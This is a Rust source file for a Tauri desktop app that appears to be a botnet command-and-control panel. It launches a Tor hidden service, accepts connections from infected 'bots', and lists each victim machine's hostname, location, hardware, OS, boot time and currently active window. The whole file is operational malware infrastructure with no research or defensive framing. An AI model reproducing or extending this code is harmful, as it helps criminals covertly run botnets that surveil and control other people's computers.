// Learn more about Tauri commands at https://tauri.app/develop/calling-rust/
use std::{ collections::HashMap, sync::Arc };
use chrono::{ DateTime, Utc };
use server::http_server::{ BotMap, ServerHandler };
use lazy_static::lazy_static;
use server_vars::types::bot::BotItem;
use tokio::sync::RwLock;
use tor_proxy::hidden_service::HiddenServiceRunner;

mod tor_proxy;
mod server;
mod router;

lazy_static! {
    pub static ref SERVER_HANDLER: Arc<RwLock<Option<ServerHandler>>> = Arc::new(RwLock::new(None));
}

#[tauri::command(async)]
async fn get_all_bots() -> Result<HashMap<String, BotItem>, String> {
    let server_ref = SERVER_HANDLER.read().await;
    if let Some(handler) = server_ref.as_ref() {
        let bot_map = handler.bot_map.read().await;

        let bot_item_map: HashMap<String, BotItem> = bot_map
            .iter()
            .filter(|(_, bot)| bot.verified)
            .map(|(id, bot)| {
                let latest_client_instance = bot.client_instances
                    .iter()
                    .max_by_key(|client_instance| client_instance.version)
                    .unwrap();

                let bot_state = &latest_client_instance.bot_state;
                let dynamic_info = &bot_state.dynamic_info;
                let ip_info = &bot_state.ip_info;
                let hardware_info = &bot_state.hw_info;

                let bot_item = BotItem {
                    id: id.clone(),
                    flag: country_emoji
                        ::flag(&ip_info.country_code.clone())
                        .unwrap_or(
                            country_emoji::flag(&ip_info.country.clone()).unwrap_or("🌎".to_owned())
                        ),
                    name: bot_state.os_info.host_name.clone().unwrap_or("-".to_owned()),
                    cpu_brand: hardware_info.cpu_brand.clone(),
                    ram: format!(
                        "{:.1} GB",
                        (hardware_info.total_ram as f64) / (1024.0 * 1024.0 * 1024.0)
                    ),
                    ping: "N/A".to_string(), // You might need to calculate this
                    join_date: bot.join_date.clone(),
                    system_boot_time: bot_state.os_info.boot_time.clone(),
                    region: ip_info.region.clone(),
                    os_info: bot_state.os_info.os_version.clone().unwrap_or("-".to_owned()),
                    active_window: dynamic_info.active_window.clone(),
                };

                (id.clone(), bot_item)
            })
            .collect();

        return Ok(bot_item_map);
    } else {
        return Err("SERVER_HANDLER is None".to_owned());
    }
}

#[tauri::command]
fn greet(name: &str) -> String {
    format!("Hello, {}! You've been greeted from Rust!", name)
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    let tokio_runtime = tokio::runtime::Builder::new_multi_thread().enable_all().build().unwrap();

    tokio_runtime.spawn(async move {
        let mut onion_proxy = HiddenServiceRunner::new();
        onion_proxy.run();
    });

    tokio_runtime.spawn(async move {
        if let Ok(mut tor_server) = ServerHandler::new().await {
            let mut server_ref = SERVER_HANDLER.write().await;
            *server_ref = Some(tor_server.clone());
            drop(server_ref);

            if let Err(e) = tor_server.listen_for_connections().await {
                eprintln!("Server errored out: {}", e);
            }
        }
    });
    tauri::Builder
        ::default()
        .plugin(tauri_plugin_opener::init())
        .invoke_handler(tauri::generate_handler![greet, get_all_bots])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
